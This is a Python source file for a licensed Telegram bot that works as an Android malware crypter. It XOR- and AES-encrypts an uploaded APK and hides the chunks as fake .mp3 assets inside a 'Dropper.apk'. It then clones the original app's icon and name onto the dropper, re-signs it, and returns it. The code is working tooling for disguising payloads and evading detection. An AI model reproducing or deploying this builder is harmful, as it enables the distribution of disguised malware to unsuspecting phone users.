import os
import json
import base64
import hashlib
import sqlite3
import datetime
import tempfile
import shutil
import subprocess
import threading
import random
import string
import time
import logging
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ----- লগিং -----
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ----- Flask -----
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK"

# ----- কনফিগারেশন -----
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN environment variable not set!")
else:
    logger.info(f"✅ BOT_TOKEN loaded (first 5 chars: {BOT_TOKEN[:5]}...)")

# ----- ক্রিপ্টো -----
OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="

def xor_data(data: bytes, key: bytes) -> bytes:
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def decode_obfuscated(b64_str: str) -> bytes:
    raw = base64.b64decode(b64_str)
    mask = hashlib.sha256("dynamic_key_rotate_monthly".encode()).digest()
    return xor_data(raw, mask)

ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
NUM_PARTS = 15
PREFIX = "part_"
TARGET_PACKAGE = "com.meteah.apl"

# ----- ডাটাবেস -----
DB_PATH = 'db/keys.db'
os.makedirs('db', exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (user_id INTEGER PRIMARY KEY, key TEXT, expiry_date TEXT)''')
    conn.commit()
    conn.close()
    logger.info("Database initialized.")

def generate_key(user_id):
    raw = os.urandom(16)
    key = hashlib.sha256(raw).hexdigest()[:16]
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO keys (user_id, key, expiry_date) VALUES (?, ?, ?)',
              (user_id, key, expiry))
    conn.commit()
    conn.close()
    return key

def validate_key(user_id, key):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT expiry_date FROM keys WHERE user_id=? AND key=?', (user_id, key))
    row = c.fetchone()
    conn.close()
    if not row:
        return False
    expiry = datetime.datetime.fromisoformat(row[0])
    return expiry > datetime.datetime.now()

def get_user_key(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT key, expiry_date FROM keys WHERE user_id=?', (user_id,))
    row = c.fetchone()
    conn.close()
    return row if row else None

def generate_build_id(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_entropy_seed(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def process_encryption(apk_data: bytes, assets_dir: str):
    xor_step = xor_data(apk_data, ACTUAL_XOR_KEY)
    iv_bytes = bytes.fromhex(IV_HEX)
    cipher = AES.new(ACTUAL_AES_KEY, AES.MODE_CBC, iv_bytes)
    encrypted_full = cipher.encrypt(pad(xor_step, AES.block_size))
    chunk_size = len(encrypted_full) // NUM_PARTS + 1
    chunks = []
    for i in range(NUM_PARTS):
        start = i * chunk_size
        end = min(start + chunk_size, len(encrypted_full))
        chunks.append(encrypted_full[start:end])
    meta = {
        "build_id": generate_build_id(),
        "timestamp": int(time.time()),
        "total_parts": NUM_PARTS,
        "chunk_size": chunk_size,
        "enc_size": len(encrypted_full),
        "original_size": len(apk_data),
        "original_md5": hashlib.md5(apk_data).hexdigest(),
        "aes_key": OBFUSCATED_AES_KEY_B64,
        "aes_iv": IV_HEX,
        "xor_key": OBFUSCATED_XOR_KEY_B64,
        "entropy_seed": generate_entropy_seed(),
        "v3_flag": True
    }
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'manifest.json'), 'w') as f:
        json.dump(meta, f, indent=4)
    for i, chunk in enumerate(chunks):
        with open(os.path.join(assets_dir, f"{PREFIX}{i}.mp3"), 'wb') as f:
            f.write(bytes(chunk))
    return meta

# ----- APK প্রসেসিং -----
async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, apk_data: bytes):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    try:
        await context.bot.send_message(chat_id, "📥 APK received. Processing started.")
    except Exception as e:
        logger.error(f"Failed to send initial message: {e}")

    work_dir = tempfile.mkdtemp()
    try:
        input_apk = os.path.join(work_dir, 'input.apk')
        with open(input_apk, 'wb') as f:
            f.write(apk_data)
        await context.bot.send_message(chat_id, "✅ APK saved.")

        await context.bot.send_message(chat_id, "📦 Decoding APK...")
        decoded_dir = os.path.join(work_dir, 'decoded')
        cmd = f"apktool d -f -o {decoded_dir} {input_apk}"
        logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Decode failed:\n{result.stderr[:500]}")
            return
        await context.bot.send_message(chat_id, "✅ Decoded successfully.")

        await context.bot.send_message(chat_id, "🔧 Changing package name...")
        manifest_path = os.path.join(decoded_dir, 'AndroidManifest.xml')
        if not os.path.exists(manifest_path):
            await context.bot.send_message(chat_id, "❌ AndroidManifest.xml not found!")
            return
        with open(manifest_path, 'r') as f:
            manifest = f.read()
        manifest = manifest.replace('package="', f'package="{TARGET_PACKAGE}"')
        with open(manifest_path, 'w') as f:
            f.write(manifest)
        await context.bot.send_message(chat_id, f"✅ Package name changed to {TARGET_PACKAGE}")

        await context.bot.send_message(chat_id, "🔐 Encrypting APK...")
        assets_dir = os.path.join(decoded_dir, 'assets')
        process_encryption(apk_data, assets_dir)
        await context.bot.send_message(chat_id, "✅ Encryption completed.")

        await context.bot.send_message(chat_id, "📦 Decoding Dropper.apk...")
        dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
        if not os.path.exists(dropper_apk):
            await context.bot.send_message(chat_id, "⚠️ Dropper.apk not found! Creating dummy...")
            with open(dropper_apk, 'wb') as f:
                f.write(b'')
        dropper_decoded = os.path.join(work_dir, 'dropper_decoded')
        cmd = f"apktool d -f -o {dropper_decoded} {dropper_apk}"
        logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
            return
        await context.bot.send_message(chat_id, "✅ Dropper decoded.")

        await context.bot.send_message(chat_id, "🎨 Copying icon and app name...")
        res_src = os.path.join(decoded_dir, 'res')
        res_dst = os.path.join(dropper_decoded, 'res')
        if os.path.exists(res_src):
            shutil.copytree(res_src, res_dst, dirs_exist_ok=True)

        strings_src = os.path.join(decoded_dir, 'res/values/strings.xml')
        if os.path.exists(strings_src):
            import xml.etree.ElementTree as ET
            tree = ET.parse(strings_src)
            root = tree.getroot()
            app_name = None
            for string in root.findall('string'):
                if string.get('name') == 'app_name':
                    app_name = string.text
                    break
            if app_name:
                strings_dst = os.path.join(dropper_decoded, 'res/values/strings.xml')
                if os.path.exists(strings_dst):
                    dtree = ET.parse(strings_dst)
                    droot = dtree.getroot()
                    for string in droot.findall('string'):
                        if string.get('name') == 'app_name':
                            string.text = app_name
                            break
                    dtree.write(strings_dst)
        await context.bot.send_message(chat_id, "✅ Icon and name copied.")

        await context.bot.send_message(chat_id, "✍️ Rebuilding APK...")
        output_apk = os.path.join(work_dir, 'output.apk')
        cmd = f"apktool b -o {output_apk} {dropper_decoded}"
        logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
            return
        await context.bot.send_message(chat_id, "✅ APK rebuilt.")

        await context.bot.send_message(chat_id, "✍️ Signing APK...")
        keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
        if not os.path.exists(keystore):
            await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
            return

        pass_file = os.path.join(os.getcwd(), 'signer', 'keystore_pass.txt')
        if os.path.exists(pass_file):
            with open(pass_file, 'r') as f:
                passwd = f.read().strip()
        else:
            passwd = os.environ.get('KEYSTORE_PASS', '123456')

        cmd = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storetype PKCS12 -storepass {passwd} -keypass {passwd} {output_apk} mykey"
        logger.info(f"Running: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
            return
        await context.bot.send_message(chat_id, "✅ APK signed.")

        await context.bot.send_message(chat_id, "📤 Sending final APK...")
        with open(output_apk, 'rb') as f:
            await context.bot.send_document(chat_id, f, filename=f"app_{user_id}.apk")
        await context.bot.send_message(chat_id, "✅ Done! APK sent.")

        shutil.rmtree(work_dir)
        logger.info(f"APK processing complete for user {user_id}")

    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.send_message(chat_id, f"❌ Error: {str(e)[:500]}")
        shutil.rmtree(work_dir, ignore_errors=True)

# ----- বট কমান্ড -----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔑 Get License Key", callback_data='get_key')],
        [InlineKeyboardButton("📤 Upload APK", callback_data='upload')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 APK Converter Bot\n\n"
        "Get a 30-day license key first.\n"
        "Then upload your APK.",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == 'get_key':
        key = generate_key(user_id)
        await query.edit_message_text(
            f"✅ Your 30-day key:\n\n`{key}`\n\n"
            f"Send /activate {key}"
        )
    elif query.data == 'upload':
        key_data = get_user_key(user_id)
        if not key_data or not validate_key(user_id, key_data[0]):
            await query.edit_message_text("❌ No valid license. Get a key first.")
            return
        await query.edit_message_text("📤 Send your APK file.")

async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /activate <key>")
        return
    user_id = update.effective_user.id
    if validate_key(user_id, args[0]):
        await update.message.reply_text("✅ Key activated!")
    else:
        await update.message.reply_text("❌ Invalid key.")

async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    key_data = get_user_key(user_id)
    if not key_data or not validate_key(user_id, key_data[0]):
        await update.message.reply_text("❌ No valid license. Get a key first.")
        return

    if not update.message.document:
        await update.message.reply_text("❌ Please send an APK file.")
        return

    if not update.message.document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ File must be .apk")
        return

    await update.message.reply_text("📦 APK received! Starting processing...")

    try:
        file = await update.message.document.get_file()
        apk_data = await file.download_as_bytearray()
        await update.message.reply_text(f"📦 File size: {len(apk_data)} bytes")

        context.application.create_task(process_apk_file(update, context, apk_data))
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to download: {str(e)}")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Commands:\n"
        "/start - Main menu\n"
        "/activate <key> - Activate license\n"
        "/help - This help"
    )

# ----- Flask-কে থ্রেডে চালানোর ফাংশন -----
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

# ----- বট রান (মেইন থ্রেডে) -----
def run_bot():
    try:
        init_db()
        if not BOT_TOKEN:
            logger.error("BOT_TOKEN missing! Bot will not start.")
            return

        application = Application.builder().token(BOT_TOKEN).build()
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("activate", activate))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.Document.ALL, upload_handler))

        logger.info("✅ Bot starting polling...")
        application.run_polling(drop_pending_updates=True)

    except Exception as e:
        logger.error(f"Bot crashed: {e}")

# ----- মেইন -----
if __name__ == "__main__":
    # Flask আলাদা থ্রেডে চালু করুন
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    # বট মেইন থ্রেডে চালু করুন
    run_bot()
